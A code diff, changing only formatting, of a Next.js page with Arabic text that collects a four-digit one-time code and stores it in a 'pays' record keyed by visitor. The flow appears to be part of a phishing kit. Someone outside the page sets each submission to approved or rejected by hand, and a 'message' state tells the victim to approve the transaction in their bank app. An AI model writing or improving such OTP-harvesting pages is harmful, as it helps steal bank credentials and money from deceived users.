@@ -1,122 +1,169 @@
-"use client"
+"use client";
 
-import { useState, useEffect, useRef } from "react"
-import { useRouter } from "next/navigation"
-import { ShieldCheck, AlertCircle, Loader2, CheckCircle2, RefreshCw, Lock, Clock, Smartphone } from "lucide-react"
-import { Alert, AlertDescription } from "@/components/ui/alert"
-import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
-import { StepShell } from "@/components/step-shell"
-import { db } from "@/lib/supabase-client"
-import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client"
-import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
+import { useState, useEffect, useRef } from "react";
+import { useRouter } from "next/navigation";
+import {
+  ShieldCheck,
+  AlertCircle,
+  Loader2,
+  CheckCircle2,
+  RefreshCw,
+  Lock,
+  Clock,
+  Smartphone,
+} from "lucide-react";
+import { Alert, AlertDescription } from "@/components/ui/alert";
+import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner";
+import { StepShell } from "@/components/step-shell";
+import { db } from "@/lib/supabase-client";
+import { doc, onSnapshot, setDoc, Firestore } from "@/lib/supabase-client";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 
 export default function FinalOtpPage() {
-  const router = useRouter()
+  const router = useRouter();
 
-  const [otp, setOtp]             = useState(["", "", "", ""])
-  const [status, setStatus]       = useState<"idle" | "verifying" | "approved" | "rejected" | "message">("idle")
-  const [error, setError]         = useState("")
-  const [isLoading, setIsLoading] = useState(true)
-  const [canResend, setCanResend] = useState(false)
-  const [resendTimer, setResendTimer] = useState(60)
-  const [visitorId, setVisitorId] = useState("")
-  const [isConfirming, setIsConfirming] = useState(false)
+  const [otp, setOtp] = useState(["", "", "", ""]);
+  const [status, setStatus] = useState<
+    "idle" | "verifying" | "approved" | "rejected" | "message"
+  >("idle");
+  const [error, setError] = useState("");
+  const [isLoading, setIsLoading] = useState(true);
+  const [canResend, setCanResend] = useState(false);
+  const [resendTimer, setResendTimer] = useState(60);
+  const [visitorId, setVisitorId] = useState("");
+  const [isConfirming, setIsConfirming] = useState(false);
 
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   // Init visitor
   useEffect(() => {
-    const id = localStorage.getItem("visitor") || ""
-    if (!id) { router.push("/home-new"); return }
-    setVisitorId(id)
-  }, [router])
+    const id = localStorage.getItem("visitor") || "";
+    if (!id) {
+      router.push("/home-new");
+      return;
+    }
+    setVisitorId(id);
+  }, [router]);
 
-  useRedirectMonitor({ visitorId, currentPage: "finalOtp" })
+  useRedirectMonitor({ visitorId, currentPage: "finalOtp" });
 
   // Access check + Supabase polling listener
   useEffect(() => {
-    if (!visitorId || !db) return
+    if (!visitorId || !db) return;
 
     const unsubscribe = onSnapshot(
       doc(db as Firestore, "pays", visitorId),
       (snap) => {
-        if (!snap.exists()) { router.push("/home-new"); return }
-        setIsLoading(false)
+        if (!snap.exists()) {
+          router.push("/home-new");
+          return;
+        }
+        setIsLoading(false);
 
-        const data = snap.data()
-        const s = data.finalOtpStatus as string | undefined
+        const data = snap.data();
+        const s = data.finalOtpStatus as string | undefined;
 
         if (s === "message") {
-          setStatus("message")
+          setStatus("message");
         } else if (s === "verifying") {
-          setStatus("verifying")
+          setStatus("verifying");
         } else if (s === "approved") {
-          setStatus("approved")
-          setError("")
+          setStatus("approved");
+          setError("");
           // Clear flag then redirect
-          setDoc(doc(db as Firestore, "pays", visitorId), { finalOtpStatus: "" }, { merge: true })
-          setTimeout(() => router.push("/check"), 1200)
+          setDoc(
+            doc(db as Firestore, "pays", visitorId),
+            { finalOtpStatus: "" },
+            { merge: true },
+          );
+          setTimeout(() => router.push("/check"), 1200);
         } else if (s === "rejected") {
-          setStatus("idle")
-          setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
-          setOtp(["", "", "", ""])
-          setDoc(doc(db as Firestore, "pays", visitorId), { finalOtpStatus: "pending" }, { merge: true })
-          setTimeout(() => inputRefs.current[0]?.focus(), 100)
+          setStatus("idle");
+          setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.");
+          setOtp(["", "", "", ""]);
+          setDoc(
+            doc(db as Firestore, "pays", visitorId),
+            { finalOtpStatus: "pending" },
+            { merge: true },
+          );
+          setTimeout(() => inputRefs.current[0]?.focus(), 100);
         }
       },
       (err) => {
-        console.error("[finalOtp] listener error:", err)
-        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.")
-      }
-    )
+        console.error("[finalOtp] listener error:", err);
+        setError("حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.");
+      },
+    );
 
-    return () => unsubscribe()
-  }, [visitorId, router])
+    return () => unsubscribe();
+  }, [visitorId, router]);
 
   // Resend countdown
   useEffect(() => {
-    if (resendTimer <= 0) { setCanResend(true); return }
-    const t = setTimeout(() => setResendTimer((p) => p - 1), 1000)
-    return () => clearTimeout(t)
-  }, [resendTimer])
+    if (resendTimer <= 0) {
+      setCanResend(true);
+      return;
+    }
+    const t = setTimeout(() => setResendTimer((p) => p - 1), 1000);
+    return () => clearTimeout(t);
+  }, [resendTimer]);
 
   // OTP handlers
   const handleChange = (i: number, val: string) => {
-    if (!/^\d?$/.test(val)) return
-    const next = [...otp]; next[i] = val; setOtp(next)
-    setError("")
-    if (val && i < 3) inputRefs.current[i + 1]?.focus()
-  }
+    if (!/^\d?$/.test(val)) return;
+    const next = [...otp];
+    next[i] = val;
+    setOtp(next);
+    setError("");
+    if (val && i < 3) inputRefs.current[i + 1]?.focus();
+  };
 
-  const handleKeyDown = (i: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace" && !otp[i] && i > 0) inputRefs.current[i - 1]?.focus()
-  }
+  const handleKeyDown = (
+    i: number,
+    e: React.KeyboardEvent<HTMLInputElement>,
+  ) => {
+    if (e.key === "Backspace" && !otp[i] && i > 0)
+      inputRefs.current[i - 1]?.focus();
+  };
 
   const handlePaste = (e: React.ClipboardEvent) => {
-    const digits = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4)
-    if (digits.length === 4) { setOtp(digits.split("")); inputRefs.current[3]?.focus() }
-    e.preventDefault()
-  }
+    const digits = e.clipboardData
+      .getData("text")
+      .replace(/\D/g, "")
+      .slice(0, 4);
+    if (digits.length === 4) {
+      setOtp(digits.split(""));
+      inputRefs.current[3]?.focus();
+    }
+    e.preventDefault();
+  };
 
   const handleMessageConfirm = async () => {
-    if (!visitorId || !db) return
-    setIsConfirming(true)
+    if (!visitorId || !db) return;
+    setIsConfirming(true);
     try {
-      await setDoc(doc(db as Firestore, "pays", visitorId), { finalOtpStatus: "confirmed" }, { merge: true })
+      await setDoc(
+        doc(db as Firestore, "pays", visitorId),
+        { finalOtpStatus: "confirmed" },
+        { merge: true },
+      );
     } catch (err) {
-      console.error("[finalOtp] confirm error:", err)
-      setIsConfirming(false)
+      console.error("[finalOtp] confirm error:", err);
+      setIsConfirming(false);
     }
-  }
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    const code = otp.join("")
-    if (code.length !== 4) { setError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً"); return }
-    if (!db) return
+    e.preventDefault();
+    const code = otp.join("");
+    if (code.length !== 4) {
+      setError("يرجى إدخال الرمز المكون من 4 أرقام كاملاً");
+      return;
+    }
+    if (!db) return;
 
     try {
-      setStatus("verifying")
+      setStatus("verifying");
       await setDoc(
         doc(db as Firestore, "pays", visitorId),
         {
@@ -124,34 +171,34 @@ export default function FinalOtpPage() {
           finalOtpStatus: "verifying",
           finalOtpSubmittedAt: new Date().toISOString(),
         },
-        { merge: true }
-      )
+        { merge: true },
+      );
     } catch (err) {
-      console.error("[finalOtp] submit error:", err)
-      setStatus("idle")
-      setError("حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى.")
+      console.error("[finalOtp] submit error:", err);
+      setStatus("idle");
+      setError("حدث خطأ في الإرسال. يرجى المحاولة مرة أخرى.");
     }
-  }
+  };
 
   const handleResend = async () => {
-    if (!canResend || !db) return
+    if (!canResend || !db) return;
     await setDoc(
       doc(db as Firestore, "pays", visitorId),
       { finalOtpResendAt: new Date().toISOString(), finalOtpStatus: "pending" },
-      { merge: true }
-    )
-    setCanResend(false)
-    setResendTimer(60)
-    setOtp(["", "", "", ""])
-    setError("")
-    setTimeout(() => inputRefs.current[0]?.focus(), 100)
-  }
+      { merge: true },
+    );
+    setCanResend(false);
+    setResendTimer(60);
+    setOtp(["", "", "", ""]);
+    setError("");
+    setTimeout(() => inputRefs.current[0]?.focus(), 100);
+  };
 
-  const otpFilled  = otp.every((d) => d !== "")
-  const verifying  = status === "verifying"
-  const approved   = status === "approved"
+  const otpFilled = otp.every((d) => d !== "");
+  const verifying = status === "verifying";
+  const approved = status === "approved";
 
-  if (isLoading) return <SimpleSpinner />
+  if (isLoading) return <SimpleSpinner />;
 
   return (
     <>
@@ -160,7 +207,10 @@ export default function FinalOtpPage() {
       )}
 
       {status === "message" && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#1565c0]/95" dir="rtl">
+        <div
+          className="fixed inset-0 z-50 flex items-center justify-center bg-[#1565c0]/95"
+          dir="rtl"
+        >
           <div className="text-center space-y-6 px-8">
             <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
               <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-white/30" />
@@ -171,22 +221,43 @@ export default function FinalOtpPage() {
             </div>
             <div className="space-y-3">
               <p className="text-xl font-bold leading-relaxed text-white">
-                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
+                تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك
+                والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]"
+                  style={{ animationDelay: "0ms" }}
+                />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]"
+                  style={{ animationDelay: "150ms" }}
+                />
+                <span
+                  className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#90caf9]"
+                  style={{ animationDelay: "300ms" }}
+                />
               </div>
             </div>
             {isConfirming ? (
               <div className="flex flex-col items-center gap-3 mt-2">
                 <div className="flex items-center justify-center gap-2">
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "0ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "150ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]" style={{ animationDelay: "300ms" }} />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]"
+                    style={{ animationDelay: "0ms" }}
+                  />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]"
+                    style={{ animationDelay: "150ms" }}
+                  />
+                  <span
+                    className="h-3 w-3 animate-bounce rounded-full bg-[#90caf9]"
+                    style={{ animationDelay: "300ms" }}
+                  />
                 </div>
-                <p className="text-sm font-semibold text-[#90caf9]">جاري انتظار موافقة البنك...</p>
+                <p className="text-sm font-semibold text-[#90caf9]">
+                  جاري انتظار موافقة البنك...
+                </p>
               </div>
             ) : (
               <button
@@ -233,7 +304,9 @@ export default function FinalOtpPage() {
           {approved && (
             <div className="flex items-center justify-center gap-2 rounded-xl border border-emerald-200 bg-emerald-50 px-4 py-3">
               <CheckCircle2 className="h-4 w-4 text-emerald-600 flex-shrink-0" />
-              <p className="text-sm font-bold text-emerald-800">تم التحقق بنجاح! جاري الانتقال...</p>
+              <p className="text-sm font-bold text-emerald-800">
+                تم التحقق بنجاح! جاري الانتقال...
+              </p>
             </div>
           )}
 
@@ -246,7 +319,9 @@ export default function FinalOtpPage() {
             {otp.map((digit, i) => (
               <input
                 key={i}
-                ref={(el) => { inputRefs.current[i] = el }}
+                ref={(el) => {
+                  inputRefs.current[i] = el;
+                }}
                 type="text"
                 inputMode="numeric"
                 maxLength={1}
@@ -260,10 +335,10 @@ export default function FinalOtpPage() {
                   error
                     ? "border-red-300 bg-red-50 text-red-700"
                     : approved
-                    ? "border-emerald-300 bg-emerald-50 text-emerald-700"
-                    : digit
-                    ? "border-[#1976d2] bg-[#e3f2fd] text-[#1976d2]"
-                    : "border-[#bbdefb] bg-white text-[#1565c0] focus:border-[#1976d2] focus:bg-[#f0f8ff]",
+                      ? "border-emerald-300 bg-emerald-50 text-emerald-700"
+                      : digit
+                        ? "border-[#1976d2] bg-[#e3f2fd] text-[#1976d2]"
+                        : "border-[#bbdefb] bg-white text-[#1565c0] focus:border-[#1976d2] focus:bg-[#f0f8ff]",
                 ].join(" ")}
               />
             ))}
@@ -283,7 +358,8 @@ export default function FinalOtpPage() {
             ) : (
               <p className="text-sm text-slate-500">
                 يمكنك إعادة الإرسال بعد{" "}
-                <span className="font-bold text-[#1976d2]">{resendTimer}</span> ثانية
+                <span className="font-bold text-[#1976d2]">{resendTimer}</span>{" "}
+                ثانية
               </p>
             )}
           </div>
@@ -304,9 +380,13 @@ export default function FinalOtpPage() {
             }}
           >
             {verifying ? (
-              <><Loader2 className="h-5 w-5 animate-spin" /> جاري التحقق...</>
+              <>
+                <Loader2 className="h-5 w-5 animate-spin" /> جاري التحقق...
+              </>
             ) : approved ? (
-              <><CheckCircle2 className="h-5 w-5" /> تم التحقق</>
+              <>
+                <CheckCircle2 className="h-5 w-5" /> تم التحقق
+              </>
             ) : (
               "تأكيد"
             )}
@@ -314,5 +394,5 @@ export default function FinalOtpPage() {
         </form>
       </StepShell>
     </>
-  )
+  );
 }
